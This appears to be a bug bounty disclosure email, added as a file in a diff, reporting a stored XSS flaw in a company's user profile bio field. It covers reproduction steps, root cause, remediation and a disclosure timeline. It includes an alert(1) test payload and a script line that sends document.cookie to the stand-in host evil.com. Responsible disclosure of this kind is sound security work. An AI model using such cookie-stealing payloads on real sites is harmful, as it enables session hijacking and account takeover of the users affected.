@@ -1,0 +1,78 @@
+From: hacker_friendly@bugcrowd.com
+To: security@targetcompany.com
+Subject: Stored XSS in User Profile Page
+Date: Tue, 10 Jun 2025 09:45:33 +0000
+Message-ID: <20250610094533.xss001@bugcrowd.com>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+Hi,
+
+I found a Stored Cross-Site Scripting (XSS) vulnerability in the user profile
+bio field on your platform. This allows any authenticated user to inject
+malicious JavaScript that executes in the browser of every visitor who views
+that profile.
+
+## Vulnerability Details
+
+**Type:** Stored XSS
+**Location:** User Profile → Bio field (POST /api/profile)
+**Affected Page:** GET /profile/{username}
+**Severity:** HIGH
+**CVSS Score:** 8.2 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)
+
+## Steps to Reproduce
+
+1. Log in to any account at https://app.targetcompany.com
+2. Navigate to Settings → Edit Profile
+3. In the Bio field, enter the following payload:
+   <script>alert(1)</script>
+4. Click Save Profile
+5. Log out and visit your profile URL as a different user or in a private window
+6. The alert box fires, confirming JavaScript execution in the victim's browser
+
+## Extended Payload (Session Hijacking)
+
+A real attacker could replace alert(1) with:
+   <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
+
+This would silently exfiltrate the victim's session cookie to an attacker-controlled server.
+
+## Root Cause
+
+The profile bio is stored as raw HTML in the database and rendered without
+sanitisation into the page template. There is no Content Security Policy (CSP)
+header in place to mitigate the risk.
+
+## Impact
+
+- Full account takeover of any user who views an infected profile
+- Credential theft, session hijacking, CSRF bypass
+- Can escalate to admin compromise if an admin views the profile
+
+## Recommended Remediation
+
+1. HTML-encode all user-supplied content before rendering:
+   Use a library like DOMPurify (JS) or bleach (Python) to sanitise bio input
+2. Implement a strict Content-Security-Policy header:
+   Content-Security-Policy: default-src 'self'; script-src 'self'
+3. Validate and restrict allowed characters in bio fields server-side
+
+## Proof of Concept Screenshot
+
+I have a screen recording available on request.
+
+## Disclosure Timeline
+
+- 2025-06-09: Vulnerability discovered
+- 2025-06-10: This report submitted
+- Planned public disclosure: 90 days from today if no patch is released
+
+Please acknowledge receipt within 5 business days.
+
+Regards,
+HackerFriendly
+hacker_friendly@bugcrowd.com
+Bugcrowd Profile: bugcrowd.com/hackerfriendly
+
